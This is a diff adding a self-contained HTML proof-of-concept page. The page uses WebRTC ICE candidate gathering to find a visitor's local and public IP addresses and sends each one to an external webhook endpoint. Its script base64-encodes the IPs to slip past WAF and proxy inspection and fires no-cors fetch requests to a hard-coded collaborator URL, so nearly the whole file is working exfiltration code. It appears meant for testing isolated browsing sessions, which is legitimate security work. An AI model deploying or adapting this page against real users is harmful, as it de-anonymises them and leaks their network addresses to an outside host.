@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>WebRTC IP Leak PoC with OOB Exfiltration</title>
+<style>
+  body { font-family: system-ui, monospace; max-width: 800px; margin: 2em auto; padding: 0 1em; }
+  h1 { font-size: 1.2em; }
+  #out { background: #111; color: #0f0; padding: 1em; white-space: pre-wrap; font-family: monospace; font-size: 13px; border-radius: 6px; min-height: 200px; }
+  .label { color: #888; }
+  .ip-public { color: #ff5; font-weight: bold; }
+  .ip-local  { color: #5cf; font-weight: bold; }
+  button { padding: 0.5em 1em; font-size: 1em; margin-bottom: 1em; }
+</style>
+</head>
+<body>
+  <h1>WebRTC ICE Candidate Dump & Exfiltration (PoC)</h1>
+  <p>Load this page from inside the isolated/proxied session. Discovered IPs will be logged below and submitted to the designated Burp Collaborator instance.</p>
+  <button id="run">Start test</button>
+  <div id="out">Click "Start test" to gather ICE candidates...</div>
+
+<script>
+const out = document.getElementById('out');
+const seen = new Set();
+// Your Burp Collaborator payload URL
+const collabUrl = "https://webhook.site/e5b0ea9e-48c4-4925-b8af-6543a2595391";
+
+function log(line, cls) {
+  const span = document.createElement('span');
+  if (cls) span.className = cls;
+  span.textContent = line + '\n';
+  out.appendChild(span);
+}
+
+function parseCandidate(cand) {
+  // candidate:foundation component protocol priority ip port typ TYPE ...
+  const parts = cand.split(' ');
+  return {
+    protocol: parts[2],
+    ip: parts[4],
+    port: parts[5],
+    type: parts[7]   // host | srflx | prflx | relay
+  };
+}
+
+function sendToCollab(type, ip, protocol) {
+  // Append data as query parameters. 
+  // Using btoa() to base64 encode the IP helps avoid any WAF/Proxy parsing issues in transit
+  const safeIp = btoa(ip);
+  const endpoint = `${collabUrl}/?type=${type}&proto=${protocol}&ip=${safeIp}`;
+  
+  fetch(endpoint, {
+    method: 'GET',
+    mode: 'no-cors' // Fire and forget, bypasses strict CORS read errors
+  }).catch(err => {
+    console.error("Exfiltration attempt failed/blocked by local policy:", err);
+  });
+}
+
+async function run() {
+  out.textContent = '';
+  log('[*] Creating RTCPeerConnection with public STUN servers...', 'label');
+
+  const pc = new RTCPeerConnection({
+    iceServers: [
+      { urls: 'stun:stun.l.google.com:19302' },
+      { urls: 'stun:stun1.l.google.com:19302' }
+    ]
+  });
+
+  // Need a data channel or media to trigger ICE gathering
+  pc.createDataChannel('leak');
+
+  pc.onicecandidate = (e) => {
+    if (!e.candidate || !e.candidate.candidate) return;
+    const c = parseCandidate(e.candidate.candidate);
+    const key = c.type + '|' + c.ip;
+    
+    // Ensure we only log and exfiltrate unique IPs
+    if (seen.has(key)) return;
+    seen.add(key);
+
+    let cls = 'label';
+    let label = '[candidate]';
+    if (c.type === 'host')  { cls = 'ip-local';  label = '[HOST  / local iface]'; }
+    if (c.type === 'srflx') { cls = 'ip-public'; label = '[SRFLX / public IP via STUN]'; }
+    if (c.type === 'relay') { cls = 'label';     label = '[RELAY]'; }
+    if (c.type === 'prflx') { cls = 'ip-public'; label = '[PRFLX / peer reflexive]'; }
+
+    log(`${label}  ${c.protocol.toUpperCase()}  ${c.ip}:${c.port}`, cls);
+    
+    // Execute the exfiltration payload
+    sendToCollab(c.type, c.ip, c.protocol);
+  };
+
+  pc.onicegatheringstatechange = () => {
+    log('[*] ICE gathering state: ' + pc.iceGatheringState, 'label');
+    if (pc.iceGatheringState === 'complete') {
+      log('\n[+] Done. SRFLX = endpoint public IP as seen by STUN.', 'label');
+      log('[+] HOST  = local network interfaces on the endpoint.', 'label');
+      log('[+] Check your Burp Collaborator client for the HTTP GET requests.', 'label');
+    }
+  };
+
+  const offer = await pc.createOffer();
+  await pc.setLocalDescription(offer);
+}
+
+document.getElementById('run').addEventListener('click', run);
+</script>
+</body>
+</html>
